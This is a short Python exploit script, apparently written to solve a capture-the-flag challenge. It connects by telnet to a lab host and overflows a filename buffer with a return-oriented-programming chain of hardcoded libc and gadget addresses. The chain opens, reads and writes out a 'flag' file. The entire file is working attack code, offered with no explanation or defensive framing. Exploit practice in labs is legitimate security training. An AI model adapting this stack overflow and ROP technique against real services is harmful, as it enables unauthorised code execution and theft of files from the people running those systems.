import sys
import struct
import telnetlib

# Socket
HOST = "192.168.56.101"
PORT = 8888
t = telnetlib.Telnet(HOST,PORT)

# Send b
def send_buf(b):
    t.write(b)

# Little Endian
def le(x):
    return struct.pack("<L",x)

# Send cmd
t.read_until("> ")
cmd = "store\n"
send_buf(cmd)
t.read_until("> ")
send_buf("200")
t.read_until("> ")

# Send file contents buf
buf = ""
buf += "A"*4
send_buf(buf)

# Send exploit buf filename
fbuf = ""
fbuf += "A"*64

# open call ROP
# Address of open: 0xb7f00060
# ret to pop2ret: 0x8048ef7
# Address of 'flag': 0x8049128
# O_RDONLY flag: 0x00
fbuf += le(0xb7f00060)
fbuf += le(0x8048ef7)
fbuf += le(0x8049128)
fbuf += le(0x00)

# read call ROP
# Address of read: 0xb7f004f0
# Address of pop3ret: 0x8048ef6
# FD: 3
# Address of buffer: 0xbffdf000
# Amount of bytes to read: 52

fbuf += le(0xb7f004f0)
fbuf += le(0x8048ef6)
fbuf += le(3)
fbuf += le(0xbffdf000)
fbuf += le(52)

# write call ROP
# Address of write: 0xb7f00570
# Address of death: 0xdeadbeef
# FD: 4
# Address of flag (stack segment address): 0xbffdf000
# Amount of bytes to read: 52

fbuf += le(0xb7f00570)
fbuf += le(0xdeadbeef)
fbuf += le(4)
fbuf += le(0xbffdf000)
fbuf += le(52)

# Send exploit buffer
send_buf(fbuf)

# recv
t.read_until("> ")

# Read flag
print("[+] Exploit Sent!")
print("[+] FLAG: {}".format(t.read_all()))
